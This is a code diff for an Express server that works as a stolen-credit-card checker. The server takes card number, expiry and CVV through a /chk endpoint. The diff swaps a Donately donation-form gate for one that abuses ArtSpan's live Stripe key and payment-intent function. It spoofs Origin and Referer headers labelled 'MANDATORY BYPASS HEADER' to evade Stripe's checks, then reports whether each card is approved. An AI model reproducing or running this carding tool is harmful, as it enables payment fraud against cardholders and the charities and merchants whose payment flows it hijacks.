@@ -5,12 +5,17 @@ const PORT = process.env.PORT || 10000;
 
 app.use(express.json());
 
-// --- FRESH 2026 DONATELY CONFIG ---
-const DONATELY_PK = 'pk_live_51MjJGSR9Gtt0ccXJYNHerVaATXNyK4JYPRgU8goQDtrLcnk7YZ8OL7uhrQF3BJaS8vT8dPoKj0Wc9JlwSwRiKs00QjccZOMX';
-const DONATELY_ACCOUNT = 'act_f9b102ae7299';
-const DONATELY_FORM = 'frm_5cb29a5d6955';
+// --- ARTPAN CONFIG ---
+const ARTPAN_PK = 'pk_live_51QVIZEBQDKIMdEl0TH6zoYwCH8E5Q1XyxJ73HNSqz7kWQUDPelsHHplSQnRUDzQGkoC2PtEqKqhgT9pkltge0jaB00C63zAYQm';
+const ARTPAN_INTENT_API = 'https://us-central1-artspanapp.cloudfunctions.net/createPaymentIntent';
 
-app.get('/', (req, res) => res.send('<h1>Hybrid Bypass API Online</h1><p>Use /chk?card=num|mm|yyyy|cvv</p>'));
+// Function to generate the IDs Stripe expects
+const genID = () => 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, (c) => {
+    const r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
+    return v.toString(16);
+});
+
+app.get('/', (req, res) => res.send('ArtSpan Surface Bypass Active 🟢'));
 
 app.get('/chk', async (req, res) => {
     const cardParam = req.query.card;
@@ -20,50 +25,75 @@ app.get('/chk', async (req, res) => {
     const fullYear = year.length === 2 ? `20${year}` : year;
 
     try {
-        // STEP 1: Generate Legacy Token (Bypasses Surface Error)
-        const tokenRes = await axios.post('https://api.stripe.com/v1/tokens', 
+        // STEP 1: Get the Client Secret from ArtSpan's Cloud Function
+        const intentRes = await axios.post(ARTPAN_INTENT_API, {
+            amount: 200,
+            email: `nero${Math.floor(Math.random()*999)}@gmail.com`,
+            live: true
+        });
+        const secret = intentRes.data.clientSecret;
+        const pi_id = secret.split('_secret')[0];
+
+        // STEP 2: Create Payment Method (The "Surface" Bypass)
+        // We use Referer: artspan.org to trick Stripe's surface check
+        const pmRes = await axios.post('https://api.stripe.com/v1/payment_methods', 
             new URLSearchParams({
+                'type': 'card',
                 'card[number]': num,
                 'card[cvc]': cvv,
                 'card[exp_month]': parseInt(mon),
                 'card[exp_year]': parseInt(fullYear),
-                'key': DONATELY_PK
+                'key': ARTPAN_PK,
+                'guid': genID(),
+                'muid': genID(),
+                'sid': genID(),
             }).toString(),
-            { headers: { 'Origin': 'https://js.stripe.com', 'Referer': 'https://js.stripe.com/' } }
+            {
+                headers: {
+                    'Accept': 'application/json',
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'Origin': 'https://js.stripe.com',
+                    'Referer': 'https://www.artspan.org/', // MANDATORY BYPASS HEADER
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                }
+            }
         ).catch(e => e.response);
 
-        if (tokenRes.data.error) {
-            return res.send(`<h2>❌ Token Error</h2><p>${tokenRes.data.error.message}</p>`);
+        if (pmRes.data.error) {
+            return res.send(`<h2>❌ Surface Error</h2><p>${pmRes.data.error.message}</p>`);
         }
 
-        const tok_id = tokenRes.data.id;
+        const pm_id = pmRes.data.id;
 
-        // STEP 2: Hit Donately API for the final bank result
-        const chargeRes = await axios.post(`https://api.donately.com/v2/donations?account_id=${DONATELY_ACCOUNT}&donation_type=cc&amount_in_cents=100&form_id=${DONATELY_FORM}`, {
-            first_name: "Richard",
-            last_name: "Biven",
-            email: `don_test${Math.floor(Math.random()*9999)}@gmail.com`,
-            payment_auth: JSON.stringify({ stripe_token: tok_id }),
-            form: JSON.stringify({ version: '5.8.117', id: DONATELY_FORM })
-        }, {
-            headers: { 'Content-Type': 'application/json', 'Referer': 'https://www-christwaymission-com.filesusr.com/' }
-        }).catch(e => e.response);
+        // STEP 3: Confirm the Payment Intent with the PM ID
+        const confirmRes = await axios.post(`https://api.stripe.com/v1/payment_intents/${pi_id}/confirm`, 
+            new URLSearchParams({
+                'payment_method': pm_id,
+                'client_secret': secret,
+                'key': ARTPAN_PK
+            }).toString(),
+            {
+                headers: {
+                    'Origin': 'https://www.artspan.org',
+                    'Referer': 'https://www.artspan.org/'
+                }
+            }
+        ).catch(e => e.response);
 
-        const data = chargeRes.data;
+        const data = confirmRes.data;
 
-        // --- RENDER HTML RESPONSE ---
-        let isSuccess = data.donation || (data.status && data.status === 'succeeded');
-        let statusColor = isSuccess ? 'green' : 'red';
-        let resultTitle = isSuccess ? '✅ Approved' : '❌ Declined';
-        let message = data.message || (data.error ? data.error.message : 'Transaction Declined');
+        // RESPONSE HANDLING
+        let statusColor = data.status === 'succeeded' ? 'green' : 'red';
+        let resultTitle = data.status === 'succeeded' ? '✅ Approved' : '❌ Declined';
+        let message = data.error ? data.error.message : 'Transaction Successful';
 
         res.send(`
             <div style="font-family: sans-serif; padding: 20px; border: 2px solid ${statusColor}; border-radius: 10px; max-width: 400px; margin: 50px auto; text-align: center;">
                 <h1 style="color: ${statusColor};">${resultTitle}</h1>
-                <p><b>Card:</b> ${num}</p>
                 <p><b>Bank Response:</b> ${message}</p>
+                <p><b>Status:</b> ${data.status}</p>
                 <hr>
-                <small>Bypass Gate: Donately-Legacy</small>
+                <small>Gate: ArtSpan Direct Handshake Bypass</small>
             </div>
         `);
 
@@ -72,4 +102,4 @@ app.get('/chk', async (req, res) => {
     }
 });
 
-app.listen(PORT, () => console.log(`Bypass API running on ${PORT}`));
+app.listen(PORT, () => console.log(`ArtSpan API running on ${PORT}`));
